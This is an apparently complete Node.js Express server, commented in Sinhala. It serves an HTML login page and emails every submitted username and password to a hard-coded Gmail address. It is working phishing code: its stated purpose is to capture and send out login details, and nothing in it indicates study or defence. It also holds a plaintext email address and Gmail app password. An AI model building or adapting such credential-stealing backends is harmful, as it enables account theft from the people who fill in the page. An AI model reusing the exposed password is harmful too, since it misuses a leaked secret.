const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const path = require("path");

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static HTML page
app.use(express.static(path.join(__dirname, "public"))); 
// ⚠️ මෙතන "public" folder එකේ ඔයාගේ HTML file (index.html) තියෙන්න ඕන

// Nodemailer Transporter
let transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "ransikachamindu43@gmail.com",   // 🔹 Gmail account
    pass: "cjwaolkyljjbparx"       // 🔹 Gmail App Password (2FA on, create App Password)
  }
});

// Capture form data and send email
app.post("/send", (req, res) => {
  const { username, password } = req.body;

  let mailOptions = {
    from: "ransikachamindu43@gmail.com",
    to: "ransikachamindu43@gmail.com",  // 🔹 Login data යන්න ඕන email
    subject: "New Login Details",
    text: `Username: ${username}\nPassword: ${password}`
  };

  transporter.sendMail(mailOptions, (err, info) => {
    if (err) {
      console.log(err);
      res.send("Error sending email");
    } else {
      console.log("Email sent: " + info.response);
      res.send("Data sent successfully!");
    }
  });
});

// Start Server
app.listen(3000, () => {
  console.log("Server running on http://localhost:3000");
});
